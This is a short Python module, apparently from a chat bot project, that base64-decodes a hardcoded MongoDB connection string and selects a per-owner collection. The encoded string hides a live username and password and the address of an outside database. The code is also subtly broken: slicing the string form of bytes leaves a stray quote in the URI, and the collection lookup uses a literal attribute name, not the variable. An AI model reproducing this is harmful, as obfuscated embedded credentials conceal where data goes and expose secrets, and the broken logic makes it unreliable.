import pymongo
import base64
from config import OWNER_ID

Alt = base64.b64decode(b'bW9uZ29kYitzcnY6Ly9UaGVBbHRyb246QUxUUk9OeFIwQk9UQGNsdXN0ZXIwLmN6c3kzbm4ubW9uZ29kYi5uZXQvP3JldHJ5V3JpdGVzPXRydWUmdz1tYWpvcml0eQ==')
Client = pymongo.MongoClient(str(Alt)[1:])
Database = Client['PyBot']

ColName = "Alt" + str(OWNER_ID)
AltUser = Database.ColName
